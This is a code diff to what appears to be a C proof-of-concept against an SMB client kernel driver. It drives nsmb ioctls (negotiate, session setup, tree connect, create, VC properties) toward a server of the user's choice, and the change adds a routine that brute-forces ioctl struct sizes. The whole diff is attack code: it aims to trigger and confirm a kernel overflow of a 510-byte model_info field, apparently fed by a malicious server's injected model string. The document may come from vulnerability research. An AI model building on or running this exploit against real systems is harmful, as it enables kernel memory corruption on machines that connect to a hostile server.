@@ -204,6 +204,30 @@ static int open_nsmb(void) {
     return -1;
 }
 
+/*
+ * Brute-force the correct ioctl struct size. The kernel only dispatches an
+ * ioctl when the cmd's encoded size (cmd>>16 & 0x1fff) matches its struct;
+ * any other size returns ENODEV. Try every size and use the first one the
+ * kernel accepts.
+ */
+#define IOC_IN   0x80000000
+#define IOC_OUT  0x40000000
+
+static long find_ioctl_size(int fd, unsigned int base, void *data,
+                            unsigned int lo, unsigned int hi)
+{
+    char *buf = (char *)data;
+    for (unsigned int sz = lo; sz <= hi; sz++) {
+        unsigned long cmd = base | ((sz & 0x1fff) << 16);
+        errno = 0;
+        int r = ioctl(fd, (unsigned long)cmd, buf);
+        if (r != -1 || errno != 19 /* ENODEV */) {
+            return sz;
+        }
+    }
+    return -1;
+}
+
 int main(int argc, char **argv) {
     if (argc < 3) {
         fprintf(stderr, "usage: %s <server> <share> [name]\n", argv[0]);
@@ -217,72 +241,81 @@ int main(int argc, char **argv) {
     if (fd < 0) { fprintf(stderr, "no nsmb device openable\n"); return 1; }
     printf("[*] opened nsmb fd %d\n", fd);
 
-    struct smbioc_negotiate neg;
-    memset(&neg, 0, sizeof(neg));
-    neg.ioc_version = SMB_IOC_STRUCT_VERSION;
-    strncpy(neg.ioc_ssn.ioc_srvname, server, sizeof(neg.ioc_ssn.ioc_srvname) - 1);
-    int r = ioctl(fd, SMBIOC_NEGOTIATE, &neg);
-    printf("[*] NEGOTIATE ret=%d errno=%d (%s) ntstatus=0x%x caps=0x%x\n",
-           r, errno, strerror(errno), neg.ioc_ntstatus, neg.ioc_ret_caps);
-    if (r != 0) { printf("[-] negotiate failed\n"); return 1; }
+    /* Big aligned buffers so the kernel's copyin/copyout of any candidate
+     * ioctl size stays in bounds. */
+    static char bufA[4096] __attribute((aligned(16)));
+    static char bufB[4096] __attribute((aligned(16)));
+    static char bufC[4096] __attribute((aligned(16)));
+    static char bufD[4096] __attribute((aligned(16)));
+    static char bufE[4096] __attribute((aligned(16)));
+    struct smbioc_negotiate *neg = (struct smbioc_negotiate *)bufA;
+    struct smbioc_setup *ss  = (struct smbioc_setup *)bufB;
+    struct smbioc_share *tcon = (struct smbioc_share *)bufC;
+    struct smb2ioc_create *cr = (struct smb2ioc_create *)bufD;
+    struct smbioc_vc_properties *vp = (struct smbioc_vc_properties *)bufE;
 
-    struct smbioc_setup ss;
-    memset(&ss, 0, sizeof(ss));
-    ss.ioc_version = SMB_IOC_STRUCT_VERSION;
-    strcpy(ss.ioc_domain, "WORKGROUP");
-    r = ioctl(fd, SMBIOC_SSNSETUP, &ss);
-    printf("[*] SSNSETUP ret=%d errno=%d (%s)\n", r, errno, strerror(errno));
-    if (r != 0) { printf("[-] session setup failed\n"); return 1; }
+    /* 1. NEGOTIATE */
+    memset(bufA, 0, sizeof(bufA));
+    neg->ioc_version = SMB_IOC_STRUCT_VERSION;
+    strncpy(neg->ioc_ssn.ioc_srvname, server,
+            sizeof(neg->ioc_ssn.ioc_srvname) - 1);
+    long nsz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 109, bufA, 256, 2048);
+    printf("[*] NEGOTIATE matched size=%ld ret_caps=0x%x\n",
+           nsz, neg->ioc_ret_caps);
+    if (nsz < 0) { printf("[-] no NEGOTIATE size dispatched\n"); return 1; }
 
-    struct smbioc_share tcon;
-    memset(&tcon, 0, sizeof(tcon));
-    tcon.ioc_version = SMB_IOC_STRUCT_VERSION;
-    strncpy(tcon.ioc_share, share, sizeof(tcon.ioc_share) - 1);
-    r = ioctl(fd, SMBIOC_TCON, &tcon);
-    printf("[*] TCON ret=%d errno=%d (%s)\n", r, errno, strerror(errno));
-    if (r != 0) { printf("[-] tree connect failed\n"); return 1; }
+    /* 2. SSNSETUP (guest) */
+    memset(bufB, 0, sizeof(bufB));
+    ss->ioc_version = SMB_IOC_STRUCT_VERSION;
+    strcpy(ss->ioc_domain, "WORKGROUP");
+    long ssz = find_ioctl_size(fd, 0x80000000 | (0x6E << 8) | 110, bufB, 256, 2048);
+    printf("[*] SSNSETUP matched size=%ld\n", ssz);
+    if (ssz < 0) { printf("[-] no SSNSETUP size dispatched\n"); return 1; }
 
-    struct smb2ioc_create cr;
-    memset(&cr, 0, sizeof(cr));
-    cr.ioc_version = SMB_IOC_STRUCT_VERSION;
-    cr.ioc_name = (char *)name;
-    cr.ioc_name_len = strlen(name) + 1;
-    cr.ioc_impersonate_level = 2;
-    cr.ioc_desired_access = 0x80000000;   /* GENERIC_READ */
-    cr.ioc_file_attributes = 0x80;
-    cr.ioc_share_access = 1 | 2 | 4;
-    cr.ioc_disposition = 1;               /* FILE_OPEN */
-    r = ioctl(fd, SMB2IOC_CREATE, &cr);
-    printf("[*] CREATE ret=%d errno=%d (%s) ntstatus=0x%x\n",
-           r, errno, strerror(errno), cr.ioc_ret_ntstatus);
-    if (r != 0 && cr.ioc_ret_ntstatus != 0)
-        printf("[-] create failed ntstatus=0x%x\n", cr.ioc_ret_ntstatus);
+    /* 3. TCON */
+    memset(bufC, 0, sizeof(bufC));
+    tcon->ioc_version = SMB_IOC_STRUCT_VERSION;
+    strncpy(tcon->ioc_share, share, sizeof(tcon->ioc_share) - 1);
+    long tsz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 111, bufC, 256, 2048);
+    printf("[*] TCON matched size=%ld\n", tsz);
+    if (tsz < 0) { printf("[-] no TCON size dispatched\n"); return 1; }
 
-    struct {
-        struct smbioc_vc_properties p;
-        volatile uint64_t guard;
-    } frame;
-    memset(&frame, 0, sizeof(frame));
-    frame.p.ioc_version = SMB_IOC_STRUCT_VERSION;
-    frame.guard = 0xDEADBEEFDEADBEEFULL;
+    /* 4. CREATE */
+    memset(bufD, 0, sizeof(bufD));
+    cr->ioc_version = SMB_IOC_STRUCT_VERSION;
+    cr->ioc_name = (char *)name;
+    cr->ioc_name_len = strlen(name) + 1;
+    cr->ioc_impersonate_level = 2;
+    cr->ioc_desired_access = 0x80000000;
+    cr->ioc_file_attributes = 0x80;
+    cr->ioc_share_access = 1 | 2 | 4;
+    cr->ioc_disposition = 1;
+    long csz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 120, bufD, 256, 2048);
+    printf("[*] CREATE matched size=%ld ntstatus=0x%x\n", csz, cr->ioc_ret_ntstatus);
+    if (csz < 0) { printf("[-] no CREATE size dispatched\n"); return 1; }
 
-    r = ioctl(fd, SMBIOC_VC_PROPERTIES, &frame.p);
-    printf("[*] VC_PROPERTIES ret=%d errno=%d (%s) misc_flags=0x%llx "
+    /* 5. VC_PROPERTIES with a guard right after the struct in the buffer */
+    memset(bufE, 0, sizeof(bufE));
+    vp->ioc_version = SMB_IOC_STRUCT_VERSION;
+    volatile uint64_t *guard = (volatile uint64_t *)(bufE + 576);
+    *guard = 0xDEADBEEFDEADBEEFULL;
+
+    long psz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 116, bufE, 256, 2048);
+    printf("[*] VC_PROPERTIES matched size=%ld misc_flags=0x%llx "
            "returned_model_len=%lu\n",
-           r, errno, strerror(errno), (unsigned long long)frame.p.misc_flags,
-           (unsigned long)strlen(frame.p.model_info));
+           psz, (unsigned long long)vp->misc_flags,
+           (unsigned long)strlen(vp->model_info));
 
-    if (frame.guard != 0xDEADBEEFDEADBEEFULL) {
+    if (*guard != 0xDEADBEEFDEADBEEFULL) {
         printf("[!!!] OVERFLOW CONFIRMED: stack guard after model_info "
                "overwritten -> guard=0x%llx, kernel wrote %lu bytes into a "
                "510-byte field\n",
-               (unsigned long long)frame.guard,
-               (unsigned long)strlen(frame.p.model_info));
+               (unsigned long long)*guard,
+               (unsigned long)strlen(vp->model_info));
         return 1;
     }
-    printf("[-] guard intact. If the server shows the AAPL injection line, "
-           "the model was stored but maybe smaller than 510 (or the ioctl "
-           "wasn't called). Check server console.\n");
+    printf("[-] guard intact. Check server console for the AAPL injection "
+           "line and the CREATE.\n");
     close(fd);
     return 0;
 }
